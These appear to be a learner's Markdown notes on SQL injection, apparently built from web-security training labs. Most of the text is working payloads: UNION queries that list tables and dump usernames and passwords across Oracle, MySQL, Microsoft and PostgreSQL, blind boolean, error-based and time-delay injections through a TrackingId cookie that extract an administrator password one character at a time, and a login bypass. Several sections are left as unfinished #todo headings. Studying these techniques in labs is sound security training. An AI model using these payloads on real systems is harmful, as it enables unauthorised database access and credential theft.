# Retrieving hidden data

## simple attack 
`https://insecure-website.com/products?category=Gifts` -> `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` 
=> after injecting `'+OR+1=1--` -> `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

## Examining the database

> **determine number of columns/which column contains text**: `'+UNION+SELECT+'abc','def'+FROM+dual--`
> **database version**: `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

- On <mark style="background: #BBFABBA6;">MySQL and Microsoft</mark>
>  `'+UNION+SELECT+'abc','def'#`
>  `'+UNION+SELECT+@@version,+NULL#`
## Listing the contents 

- <mark style="background: #FF5582A6;">Oracle</mark>
>**number of columns**: `'+UNION+SELECT+'abc','def'+FROM+dual--`
>**list of tables in the database**: `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
>**details of the columns in the table**:`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
>**usernames and passwords for all users**: `'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`

- <mark style="background: #FF5582A6;">non-Oracle</mark>
>`'+UNION+SELECT+'abc','def'--`
>`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
>`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
>`'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`

# Blind SQL injection
## triggering conditional responses

- let's say the original value of the cookie is `TrackingId=xyz`.
>1) **Modify the cookie**: `TrackingId=xyz' AND '1'='1` -> "Welcome back" message appears in the response
>2) **change it to**: `TrackingId=xyz' AND '1'='2` ->  "Welcome back" message does not appear in the response
>3) `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a` ->  there is a table called `users`
>4) `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a` -> there is a user called `administrator`
>5) `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a` -> password is greater than 1 character in length.
>6) burp intruder/Repeater =>  password is 20 characters long.
>7) `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§` -> first character
>8) `TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§` ->2nd character
>And so on...

## Error-based

### triggering conditional errors

- simple example:
> `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a` -> evaluates to `'a'` => no error 
> `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a` -> evaluates to `1/0` => divide-by-zero error
> => **you can retrieve data by testing one character at a time**: `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

- another example:
  - let's say the original value of the cookie is `TrackingId=xyz`.
>1) **Modify the cookie**: `TrackingId=xyz'` -> error message is received
>2) **change it to two quotation marks**: `TrackingId=xyz''` -> the error disappears
>3) **confirm that the server is interpreting the injection as a SQL query**:
> - `TrackingId=xyz'||(SELECT '')||'` -> `TrackingId=xyz'||(SELECT '' FROM dual)||'` -> no error => oracle database(as we used dual) 
> - `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'` -> error again
> 4) **verify that the `users` table exists** -> `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
> 5) **exploit this behavior to test conditions**: 
> - `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` -> error received
> - `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` -> error disappears
>6) **check whether the username `administrator` exists**: `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
>7) **determine the length of administrator's password**:  `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>§1§ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'` (use intruder)
>8) **test the character at each position to determine its value**: 
>- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
>- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` 
>- and so on...
### verbose SQL error messages

  - let's say the original value of the cookie is `TrackingId=xyz`.
  >1) **Modify the cookie**: `TrackingId=xyz'` -> error message is received
  >2) **comment out the rest of the query**: `TrackingId=ogAZZfxtOKUELbuJ'--` -> comments the extra single quote -> no longer error 
  >3) **raise an error using `cast` keyword**: `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--` -> error: `AND condition must be a boolean expression`
  >4) **modify the condition accordingly (to recieve no error)**: `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--` -> no longer error
  >5) **use `SELECT` to retrive usernames from database**: `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--` -> error: character limit 
  >6) **Delete the original value of the cookie(to free up some additional characters)**: `TrackingId='...` -> error: unexpectedly returned more than one row  
  >7) **Modify the query to return only one row**: `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` -> error leaks the first username: `ERROR: invalid input syntax for type integer: "administrator"`
  >8) **leak password**: `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` 
## triggering time delays

- simple example:
  >`'; IF (1=2) WAITFOR DELAY '0:0:10'--` -> condition false => no delay
  >`'; IF (1=1) WAITFOR DELAY '0:0:10'--` -> condition true => 10 sec delay
  >=> **retrive data using one character at a time**: `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

let's say we have a *cookie* called `TrackingId` and the *database is PostgreSQL* .

- *example of time delays:*
  > `TrackingId=x'||pg_sleep(10)--` -> 10 sec delay

- *time delays and information retrieval*:
> 1) **10 sec conditional delay**: 
> - `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` -> true => delay
> - `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` -> false => no delay
> 2) **confirm `administrator` user**: `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
> 3) **determine the length of the password**(use intruder/repeater): `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>§1§)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
> 4) **extract the password**(use intruder/repeater): 
> - **first character**: `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
> - **2nd**: `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
> - and so on ...
##  out-of-band (OAST) techniques
#todo
# Subverting application logic

## simple attack 
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'` 
=> submit username as `administrator'--` -> `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
# in different context 
#todo
# Second-order SQL injection 
#todo 
